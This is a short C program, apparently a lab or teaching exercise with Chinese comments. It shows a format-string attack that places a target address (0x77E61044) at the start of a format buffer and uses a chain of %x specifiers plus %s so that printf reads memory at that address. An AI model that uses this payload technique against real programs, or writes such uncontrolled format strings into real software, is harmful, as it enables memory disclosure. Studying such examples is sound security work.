#include<stdio.h>
#include<stdlib.h>
#include<string.h>

// 查看指定地址的内存内容

int main(){
	__asm int 3
	char format[40];
	//利用多个%x将%s对应的参数位置挪到存储地址77E61044的栈地址
	strcpy(format,"\x44\x10\xE6\x77%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%s");
	//输出地址0x77E61044的内存
	printf(format,1,2,3);
	return 0;
}